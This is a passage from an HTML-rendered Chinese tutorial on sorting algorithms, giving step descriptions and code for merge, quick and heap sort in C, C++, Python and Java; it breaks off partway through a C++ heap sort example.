class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MergeSort</span> <span class="keyword">implements</span> <span class="title class_">IArraySort</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sort(<span class="type">int</span>[] sourceArray) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 对 arr 进行拷贝，不改变参数内容</span></span><br><span class="line">        <span class="type">int</span>[] arr = Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (arr.length &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> arr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">middle</span> <span class="operator">=</span> (<span class="type">int</span>) Math.floor(arr.length / <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[] left = Arrays.copyOfRange(arr, <span class="number">0</span>, middle);</span><br><span class="line">        <span class="type">int</span>[] right = Arrays.copyOfRange(arr, middle, arr.length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> merge(sort(left), sort(right));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">int</span>[] merge(<span class="type">int</span>[] left, <span class="type">int</span>[] right) &#123;</span><br><span class="line">        <span class="type">int</span>[] result = <span class="keyword">new</span> <span class="title class_">int</span>[left.length + right.length];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (left.length &gt; <span class="number">0</span> &amp;&amp; right.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (left[<span class="number">0</span>] &lt;= right[<span class="number">0</span>]) &#123;</span><br><span class="line">                result[i++] = left[<span class="number">0</span>];</span><br><span class="line">                left = Arrays.copyOfRange(left, <span class="number">1</span>, left.length);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result[i++] = right[<span class="number">0</span>];</span><br><span class="line">                right = Arrays.copyOfRange(right, <span class="number">1</span>, right.length);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (left.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            result[i++] = left[<span class="number">0</span>];</span><br><span class="line">            left = Arrays.copyOfRange(left, <span class="number">1</span>, left.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (right.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            result[i++] = right[<span class="number">0</span>];</span><br><span class="line">            right = Arrays.copyOfRange(right, <span class="number">1</span>, right.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="六、快速排序"><a href="#六、快速排序" class="headerlink" title="六、快速排序"></a>六、快速排序</h3><h4 id="1-算法步骤-5"><a href="#1-算法步骤-5" class="headerlink" title="1.算法步骤"></a>1.算法步骤</h4><p>从数列中挑出一个元素，称为 “基准”（pivot）;</p><p>重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作；</p><p>递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序；</p><h4 id="2-代码实现-5"><a href="#2-代码实现-5" class="headerlink" title="2.代码实现"></a>2.代码实现</h4><h5 id="C迭代版：-1"><a href="#C迭代版：-1" class="headerlink" title="C迭代版："></a>C迭代版：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">Range</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> start, end;</span><br><span class="line">&#125; Range;</span><br><span class="line"></span><br><span class="line">Range <span class="title function_">new_Range</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> e)</span> &#123;</span><br><span class="line">    Range r;</span><br><span class="line">    r.start = s;</span><br><span class="line">    r.end = e;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *x, <span class="type">int</span> *y)</span> &#123;</span><br><span class="line">    <span class="type">int</span> t = *x;</span><br><span class="line">    *x = *y;</span><br><span class="line">    *y = t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">quick_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>; <span class="comment">// 避免len为负值时发生错误（Segment Fault）</span></span><br><span class="line">    <span class="comment">// r[]模拟列表,p为数量,r[p++]为push,r[--p]为pop且取得元素</span></span><br><span class="line">    Range r[len];</span><br><span class="line">    <span class="type">int</span> p = <span class="number">0</span>;</span><br><span class="line">    r[p++] = new_Range(<span class="number">0</span>, len - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span> (p) &#123;</span><br><span class="line">        Range range = r[--p];</span><br><span class="line">        <span class="keyword">if</span> (range.start &gt;= range.end)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="type">int</span> mid = arr[(range.start + range.end) / <span class="number">2</span>]; <span class="comment">// 选取中间点为基准点</span></span><br><span class="line">        <span class="type">int</span> left = range.start, right = range.end;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (arr[left] &lt; mid) ++left;   <span class="comment">// 检测基准点左侧是否符合要求</span></span><br><span class="line">            <span class="keyword">while</span> (arr[right] &gt; mid) --right; <span class="comment">//检测基准点右侧是否符合要求</span></span><br><span class="line">            <span class="keyword">if</span> (left &lt;= right) &#123;</span><br><span class="line">                swap(&amp;arr[left], &amp;arr[right]);</span><br><span class="line">                left++;</span><br><span class="line">                right--;               <span class="comment">// 移动指针以继续</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (left &lt;= right);</span><br><span class="line">        <span class="keyword">if</span> (range.start &lt; right) r[p++] = new_Range(range.start, right);</span><br><span class="line">        <span class="keyword">if</span> (range.end &gt; left) r[p++] = new_Range(left, range.end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="C递归版：-1"><a href="#C递归版：-1" class="headerlink" title="C递归版："></a>C递归版：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *x, <span class="type">int</span> *y)</span> &#123;</span><br><span class="line">    <span class="type">int</span> t = *x;</span><br><span class="line">    *x = *y;</span><br><span class="line">    *y = t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">quick_sort_recursive</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (start &gt;= end)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> mid = arr[end];</span><br><span class="line">    <span class="type">int</span> left = start, right = end - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">while</span> (arr[left] &lt; mid &amp;&amp; left &lt; right)</span><br><span class="line">            left++;</span><br><span class="line">        <span class="keyword">while</span> (arr[right] &gt;= mid &amp;&amp; left &lt; right)</span><br><span class="line">            right--;</span><br><span class="line">        swap(&amp;arr[left], &amp;arr[right]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (arr[left] &gt;= arr[end])</span><br><span class="line">        swap(&amp;arr[left], &amp;arr[end]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        left++;</span><br><span class="line">    <span class="keyword">if</span> (left)</span><br><span class="line">        quick_sort_recursive(arr, start, left - <span class="number">1</span>);</span><br><span class="line">    quick_sort_recursive(arr, left + <span class="number">1</span>, end);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">quick_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    quick_sort_recursive(arr, <span class="number">0</span>, len - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="C-：sort-函数即快速排序的功能实现"><a href="#C-：sort-函数即快速排序的功能实现" class="headerlink" title="C++：sort()函数即快速排序的功能实现"></a>C++：sort()函数即快速排序的功能实现</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//严蔚敏《数据结构》标准分割函数</span></span><br><span class="line"> <span class="function"><span class="type">int</span> <span class="title">Paritition1</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> low, <span class="type">int</span> high)</span> </span>&#123;</span><br><span class="line">   <span class="type">int</span> pivot = A[low];</span><br><span class="line">   <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">     <span class="keyword">while</span> (low &lt; high &amp;&amp; A[high] &gt;= pivot) &#123;</span><br><span class="line">       --high;</span><br><span class="line">     &#125;</span><br><span class="line">     A[low] = A[high];</span><br><span class="line">     <span class="keyword">while</span> (low &lt; high &amp;&amp; A[low] &lt;= pivot) &#123;</span><br><span class="line">       ++low;</span><br><span class="line">     &#125;</span><br><span class="line">     A[high] = A[low];</span><br><span class="line">   &#125;</span><br><span class="line">   A[low] = pivot;</span><br><span class="line">   <span class="keyword">return</span> low;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="type">void</span> <span class="title">QuickSort</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> low, <span class="type">int</span> high)</span> <span class="comment">//快排母函数</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (low &lt; high) &#123;</span><br><span class="line">     <span class="type">int</span> pivot = <span class="built_in">Paritition1</span>(A, low, high);</span><br><span class="line">     <span class="built_in">QuickSort</span>(A, low, pivot - <span class="number">1</span>);</span><br><span class="line">     <span class="built_in">QuickSort</span>(A, pivot + <span class="number">1</span>, high);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h5 id="Python：-5"><a href="#Python：-5" class="headerlink" title="Python："></a>Python：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">quickSort</span>(<span class="params">arr, left=<span class="literal">None</span>, right=<span class="literal">None</span></span>):</span><br><span class="line">    left = <span class="number">0</span> <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(left,(<span class="built_in">int</span>, <span class="built_in">float</span>)) <span class="keyword">else</span> left</span><br><span class="line">    right = <span class="built_in">len</span>(arr)-<span class="number">1</span> <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(right,(<span class="built_in">int</span>, <span class="built_in">float</span>)) <span class="keyword">else</span> right</span><br><span class="line">    <span class="keyword">if</span> left &lt; right:</span><br><span class="line">        partitionIndex = partition(arr, left, right)</span><br><span class="line">        quickSort(arr, left, partitionIndex-<span class="number">1</span>)</span><br><span class="line">        quickSort(arr, partitionIndex+<span class="number">1</span>, right)</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">partition</span>(<span class="params">arr, left, right</span>):</span><br><span class="line">    pivot = left</span><br><span class="line">    index = pivot+<span class="number">1</span></span><br><span class="line">    i = index</span><br><span class="line">    <span class="keyword">while</span>  i &lt;= right:</span><br><span class="line">        <span class="keyword">if</span> arr[i] &lt; arr[pivot]:</span><br><span class="line">            swap(arr, i, index)</span><br><span class="line">            index+=<span class="number">1</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    swap(arr,pivot,index-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> index-<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap</span>(<span class="params">arr, i, j</span>):</span><br><span class="line">    arr[i], arr[j] = arr[j], arr[i]</span><br></pre></td></tr></table></figure><h5 id="Java：-5"><a href="#Java：-5" class="headerlink" title="Java："></a>Java：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">QuickSort</span> <span class="keyword">implements</span> <span class="title class_">IArraySort</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sort(<span class="type">int</span>[] sourceArray) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 对 arr 进行拷贝，不改变参数内容</span></span><br><span class="line">        <span class="type">int</span>[] arr = Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> quickSort(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] quickSort(<span class="type">int</span>[] arr, <span class="type">int</span> left, <span class="type">int</span> right) &#123;</span><br><span class="line">        <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">partitionIndex</span> <span class="operator">=</span> partition(arr, left, right);</span><br><span class="line">            quickSort(arr, left, partitionIndex - <span class="number">1</span>);</span><br><span class="line">            quickSort(arr, partitionIndex + <span class="number">1</span>, right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">partition</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">        <span class="comment">// 设定基准值（pivot）</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">pivot</span> <span class="operator">=</span> left;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> pivot + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> index; i &lt;= right; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[i] &lt; arr[pivot]) &#123;</span><br><span class="line">                swap(arr, i, index);</span><br><span class="line">                index++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        swap(arr, pivot, index - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> index - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span class="line">        arr[i] = arr[j];</span><br><span class="line">        arr[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="七、堆排序"><a href="#七、堆排序" class="headerlink" title="七、堆排序"></a>七、堆排序</h3><h4 id="1-算法步骤-6"><a href="#1-算法步骤-6" class="headerlink" title="1.算法步骤"></a>1.算法步骤</h4><p>大顶堆：每个节点的值都大于或等于其子节点的值，在堆排序算法中用于升序排列；</p><p>小顶堆：每个节点的值都小于或等于其子节点的值，在堆排序算法中用于降序排列；</p><p>创建一个堆 H[0……n-1]；</p><p>把堆首（最大值）和堆尾互换；</p><p>把堆的尺寸缩小 1，并调用 shift_down(0)，目的是把新的数组顶端数据调整到相应位置；</p><p>重复步骤 2，直到堆的尺寸为 1。</p><h4 id="2-代码实现-6"><a href="#2-代码实现-6" class="headerlink" title="2.代码实现"></a>2.代码实现</h4><h5 id="C：-4"><a href="#C：-4" class="headerlink" title="C："></a>C：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b)</span> &#123;</span><br><span class="line">    <span class="type">int</span> temp = *b;</span><br><span class="line">    *b = *a;</span><br><span class="line">    *a = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">max_heapify</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">    <span class="type">int</span> dad = start;</span><br><span class="line">    <span class="type">int</span> son = dad * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (son &lt;= end) &#123;</span><br><span class="line">        <span class="keyword">if</span> (son + <span class="number">1</span> &lt;= end &amp;&amp; arr[son] &lt; arr[son + <span class="number">1</span>])</span><br><span class="line">            son++;</span><br><span class="line">        <span class="keyword">if</span> (arr[dad] &gt; arr[son])</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            swap(&amp;arr[dad], &amp;arr[son]);</span><br><span class="line">            dad = son;</span><br><span class="line">            son = dad * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">heap_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = len / <span class="number">2</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        max_heapify(arr, i, len - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = len - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        swap(&amp;arr[<span class="number">0</span>], &amp;arr[i]);</span><br><span class="line">        max_heapify(arr, <span class="number">0</span>, i - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> arr[] = &#123; <span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span> &#125;;</span><br><span class="line">    <span class="type">int</span> len = (<span class="type">int</span>) <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(*arr);</span><br><span class="line">    heap_sort(arr, len);</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="C-：-4"><a href="#C-：-4" class="headerlink" title="C++："></a>C++：</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">max_heapify</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> start, <span class="type">int</span> end)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 建立父节点指针和子节点指针</span></span><br><span class="line">    <span class="type">int</span> dad = start;</span><br><span class="line">    <span class="type">int</span> son = dad * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (son &lt;= end) &#123; <span class="comment">// 若子节点指针在范围内则进行比较</span></span><br><span class="line">        <span class="keyword">if</span> (son + <span class="number">1</span> &lt;= end &amp;&amp; arr[son] &lt; arr[son + <span class="number">1</span>]) <span class="comment">// 先比较两个子节点大小，选择最大的</span></span><br><span class="line">            son++;</span><br><span class="line">        <span class="keyword">if</span> (arr[dad] &gt; arr[son]) <span class="comment">// 如果父节点大于子节点则代表调整完成，结束</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// 交换父子内容否则继续比较</span></span><br><span class="line">            <span class="built_in">swap</span>(arr[dad], arr[son]);</span><br><span class="line">            dad = son;</span><br><span class="line">            son = dad * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">heap_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 初始化，从最后一个进行比较</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = len / <span class="number">2</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        <span class="built_in">max_heapify</span>(arr, i, len - <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 先将第一个元素和已经排好的前一个元素交换，再重新调整直到完成</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = len - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="built_in">swap</span>(arr[<span class="number">0</span>], arr[i]);</span><br><span class="line">        <span class="built_in">max_heapify</span>(arr, <span class="number">0</span>, i - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> arr[] = &#123; 